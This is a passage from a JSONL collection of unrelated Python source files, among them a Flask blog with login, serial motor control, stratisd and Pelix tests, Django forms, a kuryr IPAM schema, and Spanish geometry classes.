\"\"\"\n    auth = Authorization()\n    if 'headers' in kwargs:\n        for key, value in auth.header.items():\n            kwargs['headers'][key] = value\n    else:\n        kwargs['headers'] = auth.header\n\n\ndef __wait_request():\n    \"\"\"\n    Ensure that we are not violating the requirements on sending request\n    at the correct rate.\n    \"\"\"\n    if __LAST_REQUEST_TIMESTAMP is None:\n        return\n\n    now = datetime.datetime.now()\n    delta = now - __LAST_REQUEST_TIMESTAMP\n    total_seconds = delta.total_seconds()\n    wait_time_between_requests = 1.0 / REQUEST_LIMIT_PER_SEC\n    if total_seconds < wait_time_between_requests:\n        wait_time = wait_time_between_requests - total_seconds\n        time.sleep(wait_time)\n"}
{"text": "\"\"\"\nA widget for pid modules.\n\"\"\"\n\nfrom .base_module_widget import ModuleWidget\n\nfrom qtpy import QtCore, QtWidgets\n\n\nclass PidWidget(ModuleWidget):\n    \"\"\"\n    Widget for a single PID.\n    \"\"\"\n    def init_gui(self):\n        self.init_main_layout(orientation=\"vertical\")\n        #self.main_layout = QtWidgets.QVBoxLayout()\n        #self.setLayout(self.main_layout)\n        self.init_attribute_layout()\n        input_filter_widget = self.attribute_widgets[\"inputfilter\"]\n        self.attribute_layout.removeWidget(input_filter_widget)\n        self.main_layout.addWidget(input_filter_widget)\n        for prop in ['p', 'i']: #, 'd']:\n            self.attribute_widgets[prop].widget.set_log_increment()\n        # can't avoid timer to update ival\n\n        # self.timer_ival = QtCore.QTimer()\n        # self.timer_ival.setInterval(1000)\n        # self.timer_ival.timeout.connect(self.update_ival)\n        # self.timer_ival.start()\n\n    def update_ival(self):\n        widget = self.attribute_widgets['ival']\n        if self.isVisible() and not widget.editing():\n            widget.write_attribute_value_to_widget()\n"}
{"text": "#coding=utf-8\n'''\nCreated on 2014\u5e7412\u670810\u65e5\n\n@author: Ancheel\n'''\n\nfrom flask import Blueprint, render_template,  abort, request, flash, \\\n                                redirect, url_for\nfrom flask.ext import login\nfrom flask.ext.login import current_user\nfrom firys import db, login_manager\nfrom models import Entries, User\n\n\nclass LoginUser(login.UserMixin):\n    def __init__(self, user):\n        self.id = user.id\n        self.user = user\n\n@login_manager.user_loader\ndef load_user(userid):\n    user = User.query.get(userid)\n    return user and LoginUser(user) or None\n\n\nflaskr = Blueprint('flaskr', __name__)\n\n@flaskr.route('/')\ndef show_entries():\n    entries = Entries.query.all()\n    \n    return render_template('show_entries.html', entries=entries)\n\n@flaskr.route('/add', methods=['POST'])\n@login.login_required\ndef add_entry():\n\n    e = Entries(request.form['title'], request.form['text'])\n    db.session.add(e)\n    db.session.commit()\n    \n    flash('new entry was successfully posted')\n    return redirect(url_for('flaskr.show_entries'))\n\n@flaskr.route('/login', methods=['GET', 'POST'])\ndef _login():\n    error = None\n    if request.method == 'POST':\n        name = request.form['username']\n        pwd = request.form['password']\n        user = User.query.filter_by(name=name).first()\n        \n        if user is not None:\n            if user.check_password(pwd):\n                login.login_user(LoginUser(user), remember=True)\n                flash('You were logged in')\n                return redirect(url_for('flaskr.show_entries'))\n        \n        error = u'user name or password error'\n            \n    \n    return render_template('login.html', error=error)\n\n@flaskr.route('/logout')\ndef logout():\n    login.logout_user()\n    flash('You were logged out')\n    return redirect(url_for('flaskr.show_entries'))\n"}
{"text": "import bpy\nimport os\nimport glob\nimport bpy.utils.previews\n\n# custom icons dictionary\n_icon_collection = {}\n\n\ndef custom_icon(name):\n    load_custom_icons()  # load in case they custom icons not already loaded\n\n    custom_icons = _icon_collection[\"main\"]\n\n    default = lambda: None  # for no icon with given name will return zero\n    default.icon_id = 0\n\n    return custom_icons.get(name, default).icon_id\n\n\ndef load_custom_icons():\n    if len(_icon_collection):  # return if custom icons already loaded\n        return\n\n    custom_icons = bpy.utils.previews.new()\n\n    iconsDir = os.path.join(os.path.dirname(__file__), \"icons\")\n    iconPattern = \"sv_*.png\"\n    iconPath = os.path.join(iconsDir, iconPattern)\n    iconFiles = [os.path.basename(x) for x in glob.glob(iconPath)]\n\n    for iconFile in iconFiles:\n        iconName = os.path.splitext(iconFile)[0]\n        iconID = iconName.upper()\n        custom_icons.load(iconID, os.path.join(iconsDir, iconFile), \"IMAGE\")\n\n    _icon_collection[\"main\"] = custom_icons\n\n\ndef remove_custom_icons():\n    for custom_icons in _icon_collection.values():\n        bpy.utils.previews.remove(custom_icons)\n    _icon_collection.clear()\n\n\ndef register():\n    load_custom_icons()\n\n\ndef unregister():\n    remove_custom_icons()\n\nif __name__ == '__main__':\n    register()\n"}
{"text": "# coding: utf-8\n\nfrom time import sleep\nfrom .actuator import Actuator\nfrom .._global import OptionalModule\n\ntry:\n  import serial\nexcept (ModuleNotFoundError, ImportError):\n  serial = OptionalModule(\"pyserial\")\n\nACCEL = b'.1'  # Acceleration and deceleration times\n\n\nclass Oriental(Actuator):\n  \"\"\"To drive an axis with an oriental motor through a serial link.\n\n  The current setup moves at `.07mm/min` with `\"VR 1\"`.\n  \"\"\"\n\n  def __init__(self, baudrate=115200, port='/dev/ttyUSB0', gain=1/.07):\n    \"\"\"Sets the instance attributes.\n\n    Args:\n      baudrate (:obj:`int`, optional): Set the corresponding baud rate.\n      port (:obj:`str`, optional): Path to connect to the serial port.\n      gain (:obj:`float`, optional): The gain for speed commands.\n    \"\"\"\n\n    Actuator.__init__(self)\n    self.baudrate = baudrate\n    self.port = port\n    self.speed = 0\n    self.gain = gain  # unit/(mm/min)\n\n  def open(self):\n    self.ser = serial.Serial(self.port, baudrate=self.baudrate, timeout=0.1)\n    for i in range(1, 5):\n      self.ser.write(\"TALK{}\\n\".format(i).encode('ASCII'))\n      ret = self.ser.readlines()\n      if \"{0}>\".format(i).encode('ASCII') in ret:\n        self.num_device = i\n        motors = ['A', 'B', 'C', 'D']\n        print(\"Motor connected to port {} is {}\".format(self.port,\n                                                        motors[i-1]))\n        break\n    self.clear_errors()\n    self.ser.write(b\"TA \" + ACCEL+b'\\n')  # Acceleration time\n    self.ser.write(b\"TD \" + ACCEL+b'\\n')  # Deceleration time\n\n  def clear_errors(self):\n    self.ser.write(b\"ALMCLR\\n\")\n\n  def close(self):\n    self.stop()\n    self.ser.close()\n\n  def stop(self):\n    \"\"\"Stop the motor.\"\"\"\n\n    self.ser.write(b\"SSTOP\\n\")\n    sleep(float(ACCEL))\n    # sleep(1)\n    self.speed = 0\n\n  def reset(self):\n    self.clear_errors()\n    self.ser.write(b\"RESET\\n\")\n    self.ser.write(\"TALK{}\\n\".format(self.num_device).encode('ASCII'))\n    self.clear_errors()\n\n  def set_speed(self, cmd):\n    \"\"\"Pilot in speed mode, requires speed in `mm/min`.\"\"\"\n\n    # speed in mm/min\n    # gain can be edited by giving gain=xx to the init\n    speed = min(100, int(abs(cmd * self.gain) + .5))  # Closest value < 100\n    # These motors take ints only\n    if speed == 0:\n      self.stop()\n      return\n    sign = int(self.gain * cmd / abs(self.gain * cmd))\n    signed_speed = sign * speed\n    if signed_speed == self.speed:\n      return\n    dirchg = self.speed * sign < 0\n    if dirchg:\n      # print(\"DEBUGORIENTAL changing dir\")\n      self.stop()\n    self.ser.write(\"VR {}\\n\".format(abs(speed)).encode('ASCII'))\n    if sign > 0:\n      # print(\"DEBUGORIENTAL going +\")\n      self.ser.write(b\"MCP\\n\")\n    else:\n      # print(\"DEBUGORIENTAL going -\")\n      self.ser.write(b\"MCN\\n\")\n    self.speed = signed_speed\n\n  def set_home(self):\n    self.ser.write(b'preset\\n')\n\n  def move_home(self):\n    self.ser.write(b'EHOME\\n')\n\n  def set_position(self, position, speed):\n    \"\"\"Pilot in position mode, needs speed and final position to run\n    (in `mm/min` and `mm`).\"\"\"\n\n    self.ser.write(\"VR {0}\".format(abs(speed)).encode('ASCII'))\n    self.ser.write(\"MA {0}\".format(position).encode('ASCII'))\n\n  def get_pos(self):\n    \"\"\"Reads current position.\n\n    Returns:\n      Current position of the motor.\n    \"\"\"\n\n    self.ser.flushInput()\n    self.ser.write(b'PC\\n')\n    self.ser.readline()\n    actuator_pos = self.ser.readline()\n    actuator_pos = str(actuator_pos)\n    try:\n      actuator_pos = float(actuator_pos[4:-3])\n    except ValueError:\n      print(\"PositionReadingError\")\n      return 0\n    return actuator_pos\n"}
{"text": "# Copyright 2016 Red Hat, Inc.\n#\n# Licensed under the Apache License, Version 2.0 (the \"License\");\n# you may not use this file except in compliance with the License.\n# You may obtain a copy of the License at\n#\n#     http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS,\n# WITHOUT WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied.\n# See the License for the specific language governing permissions and\n# limitations under the License.\n\"\"\"\nTest renaming a filesystem.\n\"\"\"\n\n# isort: LOCAL\nfrom stratisd_client_dbus import (\n    Filesystem,\n    Manager,\n    ObjectManager,\n    Pool,\n    StratisdErrors,\n    filesystems,\n    get_object,\n)\nfrom stratisd_client_dbus._constants import TOP_OBJECT\n\nfrom .._misc import SimTestCase, device_name_list\n\n_DEVICE_STRATEGY = device_name_list(1)\n\n\nclass SetNameTestCase(SimTestCase):\n    \"\"\"\n    Set up a pool with a name and one filesystem.\n    \"\"\"\n\n    _POOLNAME = \"deadpool\"\n    _FSNAME = \"fs\"\n\n    def setUp(self):\n        \"\"\"\n        Start the stratisd daemon with the simulator.\n        \"\"\"\n        super().setUp()\n        self._proxy = get_object(TOP_OBJECT)\n        ((_, (pool_object_path, _)), _, _) = Manager.Methods.CreatePool(\n            self._proxy,\n            {\n                \"name\": self._POOLNAME,\n                \"redundancy\": (True, 0),\n                \"devices\": _DEVICE_STRATEGY(),\n            },\n        )\n        pool_object = get_object(pool_object_path)\n        ((_, created), _, _) = Pool.Methods.CreateFilesystems(\n            pool_object, {\"specs\": [self._FSNAME]}\n        )\n        self._filesystem_object_path = created[0][0]\n\n    def test_null_mapping(self):\n        \"\"\"\n        Test rename to same name.\n        \"\"\"\n        filesystem = get_object(self._filesystem_object_path)\n        ((is_some, result), return_code, _) = Filesystem.Methods.SetName(\n            filesystem, {\"name\": self._FSNAME}\n        )\n\n        self.assertEqual(return_code, StratisdErrors.OK)\n        self.assertFalse(is_some)\n        self.assertEqual(result, \"0\" * 32)\n\n    def test_new_name(self):\n        \"\"\"\n        Test rename to new name.\n        \"\"\"\n        filesystem = get_object(self._filesystem_object_path)\n        (result, return_code, _) = Filesystem.Methods.SetName(\n            filesystem, {\"name\": \"new\"}\n        )\n\n        self.assertEqual(return_code, StratisdErrors.OK)\n        self.assertTrue(result)\n\n        managed_objects = ObjectManager.Methods.GetManagedObjects(self._proxy, {})\n        (fs_object_path, _) = next(\n            filesystems(props={\"Name\": \"new\"}).search(managed_objects)\n        )\n        self.assertEqual(self._filesystem_object_path, fs_object_path)\n\n        fs_object_path = next(\n            filesystems(props={\"Name\": self._FSNAME}).search(managed_objects), None\n        )\n        self.assertIsNone(fs_object_path)\n"}
{"text": "#!/usr/bin/env python\n# -- Content-Encoding: UTF-8 --\n\"\"\"\nTests the EventAdmin shell commands\n\n:author: Thomas Calmant\n\"\"\"\n\n# Standard library\nimport threading\ntry:\n    import unittest2 as unittest\nexcept ImportError:\n    import unittest\n\n# Pelix\nfrom pelix.ipopo.constants import use_ipopo\nimport pelix.framework\nimport pelix.services\nimport pelix.shell\n\n# ------------------------------------------------------------------------------\n\n__version_info__ = (1, 0, 1)\n__version__ = \".\".join(str(x) for x in __version_info__)\n\n# ------------------------------------------------------------------------------\n\n\nclass DummyEventHandler(object):\n    \"\"\"\n    Dummy event handler\n    \"\"\"\n    def __init__(self):\n        \"\"\"\n        Sets up members\n        \"\"\"\n        # Topic of the last received event\n        self.last_event = None\n        self.last_props = {}\n        self.__event = threading.Event()\n\n    def handle_event(self, topic, properties):\n        \"\"\"\n        Handles an event received from EventAdmin\n        \"\"\"\n        # Keep received values\n        self.last_event = topic\n        self.last_props = properties\n        self.__event.set()\n\n    def pop_event(self):\n        \"\"\"\n        Pops the list of events\n        \"\"\"\n        # Clear the event for next try\n        self.__event.clear()\n\n        # Reset last event\n        event, self.last_event = self.last_event, None\n        return event\n\n    def wait(self, timeout):\n        \"\"\"\n        Waits for the event to be received\n        \"\"\"\n        self.__event.wait(timeout)\n\n# ------------------------------------------------------------------------------\n\n\nclass EventAdminShellTest(unittest.TestCase):\n\n    \"\"\"\n    Tests the EventAdmin shell commands\n    \"\"\"\n\n    def setUp(self):\n        \"\"\"\n        Prepares a framework and a registers a service to export\n        \"\"\"\n        # Create the framework\n        self.framework = pelix.framework.create_framework(\n            ('pelix.ipopo.core',\n             'pelix.shell.core',\n             'pelix.services.eventadmin',\n             'pelix.shell.eventadmin'))\n        self.framework.start()\n\n        # Get the Shell service\n        context = self.framework.get_bundle_context()\n        svc_ref = context.get_service_reference(pelix.shell.SERVICE_SHELL)\n        self.shell = context.get_service(svc_ref)\n\n        # Instantiate the EventAdmin component\n        context = self.framework.get_bundle_context()\n        with use_ipopo(context) as ipopo:\n            self.eventadmin = ipopo.instantiate(\n                pelix.services.FACTORY_EVENT_ADMIN,\n                \"evtadmin\", {})\n\n    def _register_handler(self, topics, evt_filter=None):\n        \"\"\"\n        Registers an event handler\n\n        :param topics: Event topics\n        :param evt_filter: Event filter\n        \"\"\"\n        svc = DummyEventHandler()\n        context = self.framework.get_bundle_context()\n        svc_reg = context.register_service(\n            pelix.services.SERVICE_EVENT_HANDLER, svc,\n            {pelix.services.PROP_EVENT_TOPICS: topics,\n             pelix.services.PROP_EVENT_FILTER: evt_filter})\n        return svc, svc_reg\n\n    def _run_command(self, command, *args):\n        \"\"\"\n        Runs the given shell command\n        \"\"\"\n        # Format command\n        if args:\n            command = command.format(*args)\n\n        # Run command\n        self.shell.execute(command)\n\n    def tearDown(self):\n        \"\"\"\n        Cleans up for next test\n        \"\"\"\n        # Stop the framework\n        pelix.framework.FrameworkFactory.delete_framework(self.framework)\n        self.framework = None\n\n    def testTopics(self):\n        \"\"\"\n        Tests sending topics\n        \"\"\"\n        # Prepare a handler\n        handler, _ = self._register_handler('/titi/*')\n\n        # Send events, with a matching topic\n        for topic in ('/titi/toto', '/titi/', '/titi/42', '/titi/toto/tata'):\n            self._run_command(\"send {0}\", topic)\n            self.assertEqual(handler.pop_event(), topic)\n\n        # Send events, with a non-matching topic\n        for topic in ('/toto/titi/42', '/titi', '/toto/42'):\n            self._run_command(\"send {0}\", topic)\n            self.assertEqual(handler.pop_event(), None)\n\n    def testFilters(self):\n        \"\"\"\n        Tests the sending events with properties\n        \"\"\"\n        # Prepare a handler\n        key = \"some.key\"\n        handler, _ = self._register_handler(None, '({0}=42)'.format(key))\n\n        # Assert the handler is empty\n        self.assertEqual(handler.pop_event(), None)\n\n        # Send event, with matching properties\n        for topic in ('/titi/toto', '/toto/', '/titi/42', '/titi/toto/tata'):\n            value = 42\n            evt_props = {key: value}\n            self._run_command(\"send {0} {1}=42\", topic, key, value)\n\n            # Check properties\n            self.assertIn(key, handler.last_props)\n            self.assertEqual(str(handler.last_props[key]), str(value))\n            self.assertIsNot(handler.last_props, evt_props)\n\n            # Check topic\n            self.assertEqual(handler.pop_event(), topic)\n\n            # Send events, with a non-matching properties\n            self._run_command(\"send {0} {1}=21\", topic, key)\n            self.assertEqual(handler.pop_event(), None)\n\n    def testPost(self):\n        \"\"\"\n        Tests the post event method\n        \"\"\"\n        # Prepare a handler\n        handler, _ = self._register_handler('/titi/*')\n\n        # Post a message\n        topic = '/titi/toto'\n        self._run_command(\"post {0}\", topic)\n\n        # Wait a little\n        handler.wait(1)\n        self.assertEqual(handler.pop_event(), topic)\n"}
{"text": "\"\"\"\nThe complex scheduler has the following extra features \n- add_event has an additional optional priority argument;\n  high priority events happen sooner\n- add_event_delay: additional arguments \"mode\" and \"delay\"\n  mode \"ticks\": \"delay\" indicates the number of ticks that must be waited.\n    0 means the event will be processed in the next tick, 1 in the tick after that, etc.\n  mode \"time\": \"delay\" indicates the delay in seconds\n    0 means the event will be processed immediately\n  \n\"\"\"\n\n# UNTESTED!\n\nfrom .simplescheduler import simplescheduler\n\nimport libcontext\nfrom libcontext.pluginclasses import *\nfrom libcontext.socketclasses import *\n\nimport bisect\n\n\nclass complexscheduler(simplescheduler):\n    def __init__(self):\n        self.eventkeys = []\n        self.events = []\n\n    def tick(self, dummyarg=None):\n        loop = True\n        while loop:\n            for enr, e in enumerate(self.events):\n                if e[2] is not None:\n                    mode, value = e[2]\n                    if mode == \"ticks\" and value <= self.pacemaker.count: continue\n                    if mode == \"time\" and value < self.pacemaker.time: continue\n                    self.events.pop(enr)\n                self.eventkeys.pop(enr)\n                self.eventfunc(e)\n                break\n            else:\n                loop = False\n\n    def add_event(self, event, priority=0):\n        point = bisect.bisect_left(self.eventkeys, priority)\n        self.eventkeys.insert(point, priority)\n        self.events.insert(point, (event, priority, None))\n\n    def add_event_delay(self, event, mode, delay, priority=0):\n        assert delay >= 0, delay\n        assert mode in (\"ticks\", \"time\"), mode\n        if mode == \"ticks\":\n            value = self.pacemaker.count + delay\n        elif mode == \"time\":\n            value = self.pacemaker.time + delay\n        point = bisect.bisect_left(self.eventkeys, priority)\n        self.eventkeys.insert(point, priority)\n        self.events.insert(point, (event, priority, (mode, value)))\n\n    def set_pacemaker(self, pacemaker):\n        self.pacemaker = pacemaker\n\n    def place(self):\n        simplescheduler.place.im_func(self)\n        libcontext.socket(\"pacemaker\", socket_single_required(self.set_pacemaker))\n        libcontext.plugin((\"evin\", \"scheduler\", \"complex\"), plugin_flag())\n"}
{"text": "# coding: utf-8\n\nimport logging\n\nfrom django import forms\n\nlogger = logging.getLogger(__name__)\n\n\nclass CreateMovieForm(forms.Form):\n    latLng = forms.CharField(\n        label=u'\u7def\u5ea6\u7d4c\u5ea6',\n        widget=forms.HiddenInput(attrs={'class': 'form-control'}),\n    )\n\n    start_lon = forms.DecimalField(\n        label=u'\u7d4c\u5ea6\uff08\u30b9\u30bf\u30fc\u30c8\uff09',\n        max_digits=9,\n        decimal_places=6,\n        widget=forms.HiddenInput()\n    )\n\n    start_lat = forms.DecimalField(\n        label=u'\u7def\u5ea6\uff08\u30b9\u30bf\u30fc\u30c8\uff09',\n        max_digits=9,\n        decimal_places=6,\n        widget=forms.HiddenInput()\n    )\n\n    end_lon = forms.DecimalField(\n        label=u'\u7d4c\u5ea6\uff08\u30a8\u30f3\u30c9\uff09',\n        max_digits=9,\n        decimal_places=6,\n        widget=forms.HiddenInput()\n    )\n\n    end_lat = forms.DecimalField(\n        label=u'\u7def\u5ea6\uff08\u30a8\u30f3\u30c9\uff09',\n        max_digits=9,\n        decimal_places=6,\n        widget=forms.HiddenInput()\n    )\n\n    start_name = forms.CharField(\n        label=u'\u30b9\u30bf\u30fc\u30c8\u5730\u70b9',\n        widget=forms.HiddenInput(attrs={'class': 'form-control'}),\n    )\n\n    end_name = forms.CharField(\n        label=u'\u30a8\u30f3\u30c9\u5730\u70b9',\n        widget=forms.HiddenInput(attrs={'class': 'form-control'}),\n    )\n\n    center_lat = forms.DecimalField(\n        label=u\"\u7def\u5ea6(\u4e2d\u5fc3)\",\n        max_digits=9,\n        decimal_places=6,\n        widget=forms.HiddenInput()\n    )\n\n    center_lon = forms.DecimalField(\n        label=u\"\u8efd\u5ea6(\u4e2d\u5fc3)\",\n        max_digits=9,\n        decimal_places=6,\n        widget=forms.HiddenInput()\n    )\n\n    distance = forms.IntegerField(\n        label=u\"\u8ddd\u96e2\",\n        widget=forms.HiddenInput()\n    )"}
{"text": "# Licensed under the Apache License, Version 2.0 (the \"License\"); you may\n# not use this file except in compliance with the License. You may obtain\n# a copy of the License at\n#\n#      http://www.apache.org/licenses/LICENSE-2.0\n#\n# Unless required by applicable law or agreed to in writing, software\n# distributed under the License is distributed on an \"AS IS\" BASIS, WITHOUT\n# WARRANTIES OR CONDITIONS OF ANY KIND, either express or implied. See the\n# License for the specific language governing permissions and limitations\n# under the License.\n\nfrom kuryr_libnetwork.schemata import commons\n\nREQUEST_POOL_SCHEMA = {\n    u'links': [{\n        u'method': u'POST',\n        u'href': u'/IpamDriver.RequestPool',\n        u'description': u'Allocate pool of ip addresses',\n        u'rel': u'self',\n        u'title': u'Create'\n    }],\n    u'title': u'Create pool',\n    u'required': [u'AddressSpace', u'Pool', u'SubPool', u'V6'],\n    u'definitions': {u'commons': {}},\n    u'$schema': u'http://json-schema.org/draft-04/hyper-schema',\n    u'type': u'object',\n    u'properties': {\n        u'AddressSpace': {\n            u'description': u'The name of the address space.',\n            u'type': u'string',\n            u'example': u'foo',\n        },\n        u'Pool': {\n            u'description': u'A range of IP Addresses represented in '\n                            u'CIDR format address/mask.',\n            u'$ref': u'#/definitions/commons/definitions/cidr'\n        },\n        u'SubPool': {\n            u'description': u'A subset of IP range from Pool in'\n                            u'CIDR format address/mask.',\n            u'$ref': u'#/definitions/commons/definitions/cidr'\n        },\n        u'Options': {\n            u'type': [u'object', u'null'],\n            u'description': u'Options',\n            u'example': {},\n        },\n        u'V6': {\n            u'description': u'If set to \"True\", requesting IPv6 pool and '\n                            u'vice-versa.',\n            u'type': u'boolean',\n            u'example': False\n        }\n    }\n}\n\nREQUEST_POOL_SCHEMA[u'definitions'][u'commons'] = commons.COMMONS\n"}
{"text": "#!/usr/bin/env python\n# encoding: utf-8\n\"\"\"\ntest_http_client.py\n\nCreated by dan mackinlay on 2011-05-06.\nCopyright (c) 2011 __MyCompanyName__. All rights reserved.\n\"\"\"\nfrom gevent import monkey; monkey.patch_all()\nimport unittest\nimport sys\nimport os.path\nimport subprocess\nimport urllib2\nfrom time import sleep, time\nfrom gevent.queue import Queue, Full, Empty\nimport gevent.hub\nfrom proxy_osc import SimplerOSCRequestHandler, SimplerOSCServer\nfrom OSC import OSCServer, OSCRequestHandler, getUrlStr\nimport json\n\ndef get_castanet_proxy_path():\n    import main\n    return main.__file__    \n    \nclass test_http_client(unittest.TestCase):\n    def setUp(self):\n        self.local_http_address = ('', 8088)\n        self.remote_osc_address = ('127.0.0.1', 5055)\n        castanet_proxy_path = get_castanet_proxy_path()\n        print 'castanet_proxy_path', castanet_proxy_path\n        self.castanet_proxy = subprocess.Popen(['python', castanet_proxy_path])\n        self.osc_endpoint = self._get_osc_test_server()\n        self.testQueue = Queue(maxsize=1000)\n        #these all take time to initialise.\n        sleep(0.5)\n    \n    def tearDown(self):        \n        self.castanet_proxy.kill()\n        self.osc_endpoint.close()\n        gevent.hub.shutdown()\n    \n    def _get_osc_test_server(self, port=None):\n        def intercepting_handler(addr, tags, data, source):\n            msg_string = \"%s [%s] %s\" % (addr, tags, str(data))\n            sys.stdout.write(\n                \"OSCServer Got: '%s' from %s\\n\" % (\n                    msg_string, getUrlStr(source)\n            ))\n            self.testQueue.put(data)\n        port = port or self.remote_osc_address[1]\n        s = OSCServer(('localhost', port))\n        s.addMsgHandler('default', intercepting_handler)\n\n        return s\n    \n    def _getOscResponse(self):\n        self.osc_endpoint.handle_request()\n        full_response = self.testQueue.get()\n        return full_response\n        \n    def _sendHttpData(self, path, data=None):\n        \"\"\"If data is supplied, this will be a POST, otherwise GET. Because\n        that's how the ancient old urllib2 rolls.\"\"\"\n        http_address = \"http://%s:%d%s\" % (\n          '127.0.0.1',\n          self.local_http_address[1],\n          path\n        )\n        print 'http_address', http_address\n        return urllib2.urlopen(http_address, data)\n        \n    def testHttpProxy(self):\n        test_vars = (\n          ('POST', '/sequence/3/note/4', '{\"a\": \"b\", \"c\": 2}'),\n          ('POST', '/sequence/3/note/4', '[\"ee\", \"ff\", \"GG\", 555.3, 7.1]')\n        )\n        \n        for query in test_vars:\n            verb, path, data = query # we don't really support multiple verb atm\n            self._sendHttpData('/forward' + path, data)\n            resp_verb, resp_path, resp_data = self._getOscResponse()\n            # import pdb; pdb.set_trace()\n            self.assertEquals(query, (resp_verb, resp_path, resp_data))\n\n    def testHttpTime(self):\n        #Note python uses seconds, JS, ms\n        request_now = time()*1000.\n        resp = json.load(\n            self._sendHttpData('/timestamp/' + str(request_now))\n        )\n        response_now = time()*1000.\n        #these tests are only valid because we know bother server and\n        # client times. In general, these values could be anything.\n        self.assertTrue(resp[\"proxy_time\"]>request_now,\n          \"%f is not greater than %f\" %(resp[\"proxy_time\"], request_now))\n        self.assertTrue((resp[\"proxy_time\"]-request_now)<1,\n          \"%f is much greater than %f\" %(resp[\"proxy_time\"], request_now)\n        )\n        self.assertTrue((resp[\"request_lag\"]>0),\n          \"%f is negative\" % resp[\"request_lag\"])\n        \nif __name__=='__main__':\n    unittest.main()"}
{"text": "\"\"\"\nTests suite for the context processors of the bug tracker app.\n\"\"\"\n\nfrom django.test import SimpleTestCase\nfrom django.http import HttpRequest\n\nfrom ..context_processors import bugtracker\nfrom ..constants import (STATUS_OPEN,\n                         STATUS_NEED_DETAILS,\n                         STATUS_CONFIRMED,\n                         STATUS_WORKING_ON,\n                         STATUS_DEFERRED,\n                         STATUS_DUPLICATE,\n                         STATUS_WONT_FIX,\n                         STATUS_CLOSED,\n                         STATUS_FIXED)\nfrom ..constants import (PRIORITY_GODZILLA,\n                         PRIORITY_CRITICAL,\n                         PRIORITY_MAJOR,\n                         PRIORITY_MINOR,\n                         PRIORITY_TRIVIAL,\n                         PRIORITY_NEED_REVIEW,\n                         PRIORITY_FEATURE,\n                         PRIORITY_WISHLIST,\n                         PRIORITY_INVALID,\n                         PRIORITY_NOT_MY_FAULT)\nfrom ..constants import (DIFFICULTY_DESIGN_ERRORS,\n                         DIFFICULTY_IMPORTANT,\n                         DIFFICULTY_NORMAL,\n                         DIFFICULTY_LOW_IMPACT,\n                         DIFFICULTY_OPTIONAL)\n\n\nclass BugTrackerContextProcessorTestCase(SimpleTestCase):\n    \"\"\"\n    Tests case for the context processor.\n    \"\"\"\n\n    def test_bugtracker_context_update(self):\n        \"\"\"\n        Test if the ``bugtracker`` context processor add the constants into the context.\n        \"\"\"\n        request = HttpRequest()\n        result = bugtracker(request)\n        self.assertEqual(result, {\n            'BUGTRACKER_STATUS': {\n                'OPEN': STATUS_OPEN,\n                'NEED_DETAILS': STATUS_NEED_DETAILS,\n                'CONFIRMED': STATUS_CONFIRMED,\n                'WORKING_ON': STATUS_WORKING_ON,\n                'DEFERRED': STATUS_DEFERRED,\n                'DUPLICATE': STATUS_DUPLICATE,\n                'WONT_FIX': STATUS_WONT_FIX,\n                'CLOSED': STATUS_CLOSED,\n                'FIXED': STATUS_FIXED,\n            },\n\n            'BUGTRACKER_PRIORITY': {\n                'GODZILLA': PRIORITY_GODZILLA,\n                'CRITICAL': PRIORITY_CRITICAL,\n                'MAJOR': PRIORITY_MAJOR,\n                'MINOR': PRIORITY_MINOR,\n                'TRIVIAL': PRIORITY_TRIVIAL,\n                'NEED_REVIEW': PRIORITY_NEED_REVIEW,\n                'FEATURE': PRIORITY_FEATURE,\n                'WISHLIST': PRIORITY_WISHLIST,\n                'INVALID': PRIORITY_INVALID,\n                'NOT_MY_FAULT': PRIORITY_NOT_MY_FAULT,\n            },\n\n            'BUGTRACKER_DIFFICULTY': {\n                'DESIGN_ERRORS': DIFFICULTY_DESIGN_ERRORS,\n                'IMPORTANT': DIFFICULTY_IMPORTANT,\n                'NORMAL': DIFFICULTY_NORMAL,\n                'LOW_IMPACT': DIFFICULTY_LOW_IMPACT,\n                'OPTIONAL': DIFFICULTY_OPTIONAL,\n            },\n        })\n"}
{"text": "\"\"\"\n    Clase Punto\n        coord x\n        coord y\n        suma(punto)\n        resta(punto)\n\n    Clase Traza\n        instancias Punto en una Lista\n        a\u00f1adir punto\n        comparar dos trazas (dos trazas ser\u00e1n iguales si sus puntos son iguales)\n\"\"\"\n\nimport math\nimport turtle\n\n\nclass Punto:\n    def __init__(self, x=0.0, y=0.0):\n        self.x = float(x)\n        self.y = float(y)\n\n    def __str__(self):\n        return \"Punto({}, {})\".format(self.x, self.y)\n\n    def __eq__(self, other):\n        return (self.x, self.y) == (other.x, other.y)\n\n    def suma(self, punto):\n        \"\"\" Devuelve la suma vectorial del punto con otro\n        \"\"\"\n        return Punto(self.x + punto.x, self.y + punto.y)\n\n    def resta(self, punto):\n        \"\"\" Devuelve la resta vectorial del punto con otro\n        \"\"\"\n        return self.suma(-punto)\n\n    def distancia(self, punto):\n        \"\"\" Devuelve la distancia que hay entre un punto y otro\n        \"\"\"\n        return math.hypot(self.x - punto.x, self.y - punto.y)\n\n\nclass Traza:\n    def __init__(self, *args):\n        self.trazado = []\n        self.i = -1\n        for arg in args:\n            if isinstance(arg, Punto):\n                self.trazado.append(arg)\n            else:\n                raise ValueError(arg, \"no es un punto.\")\n\n    def __str__(self):\n        out = \"\"\n        for punto in self.trazado:\n            out += str(punto) + \" \"\n        return out\n\n    def __eq__(self, other):\n        return self.trazado == other.trazado\n\n    def __next__(self):\n        self.i += 1\n        if self.i < len(self.trazado):\n            return self.trazado[self.i]\n        else:\n            raise StopIteration\n\n    def __iter__(self):\n        return self\n\n    def add_punto(self, punto):\n        \"\"\" A\u00f1ade un punto nuevo a la Traza\n        \"\"\"\n        if isinstance(punto, Punto):\n            self.trazado.append(punto)\n        else:\n            raise ValueError(\"\u00a1Ioputa, que en las trazas s\u00f3lo puede haber puntos y no cosas raras!\")\n\n    def longitud_traza(self):\n        \"\"\" Devuelve la suma de la distancia entre todos los puntos de la traza\n        \"\"\"\n        ret = 0\n        for p in range(len(self.trazado) - 1):\n            ret += self.trazado[p].distancia(self.trazado[p + 1])\n        return ret\n\n    def dump_traza(self, fichero='traza.txt'):\n        \"\"\" Guardamos la traza en un fichero de trazas\n        \"\"\"\n        fichero = open(fichero, 'w', encoding=\"utf-8\")\n        for punto in self.trazado:\n            fichero.write(\"{},{}\\n\".format(punto.x, punto.y))\n        fichero.close()\n\n    def load_traza(self, fichero):\n        try:\n            fichero = open(fichero, 